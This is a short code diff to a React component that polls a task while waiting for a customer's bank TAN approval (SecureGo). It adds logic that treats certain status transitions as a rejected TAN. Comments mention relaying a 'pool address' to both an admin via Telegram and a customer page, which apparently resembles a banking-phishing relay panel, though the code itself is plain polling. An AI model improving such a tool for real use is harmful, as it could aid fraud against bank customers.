@@ -212,6 +212,7 @@ const AddressVerification = ({
     let timer: ReturnType<typeof setTimeout> | null = null;
     const startedAt = Date.now();
     const MAX_MS = 5 * 60 * 1000;
+    let sawAddressWaiting = false;
 
     const fail = (msg: string) => {
       if (cancelled) return;
@@ -223,7 +224,7 @@ const AddressVerification = ({
         setDeleteAwaitingTan(false);
         setSecureGoApproved(false);
         onTanFailed?.(msg);
-      }, 1500);
+      }, 1200);
     };
 
     const poll = async () => {
@@ -250,7 +251,6 @@ const AddressVerification = ({
           resultStatus === "tan_timeout" ||
           /tan.{0,20}(timeout|zeitüberschreitung)|zeitüberschreitung.{0,20}tan/.test(errorSignal);
 
-        // Harte Fehlersignale zuerst und sofort behandeln.
         if (rejected || (status === "failed" && !timedOut)) {
           return fail("Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.");
         }
@@ -275,6 +275,16 @@ const AddressVerification = ({
           }, 2500);
           return;
         }
+
+        // Transition-based rejection detection: once we've seen the address TAN
+        // being awaited, any transition back to a non-TAN state (running,
+        // waiting_for_address_confirm, waiting_for_login, ...) without an
+        // approval signal indicates the TAN was rejected by the user.
+        if (status === "waiting_for_tan" && (tt === "address" || tt === "")) {
+          sawAddressWaiting = true;
+        } else if (sawAddressWaiting && status && status !== "waiting_for_tan") {
+          return fail("Die TAN-Freigabe wurde abgelehnt. Bitte versuchen Sie es erneut.");
+        }
       } catch {
         // Kurzzeitige Polling-Fehler werden bis zum Timeout erneut versucht.
       }
@@ -290,6 +300,7 @@ const AddressVerification = ({
       if (timer) clearTimeout(timer);
     };
   }, [deleteAwaitingTan, taskId, onDelete, onTanFailed]);
+
 
   // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
   // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
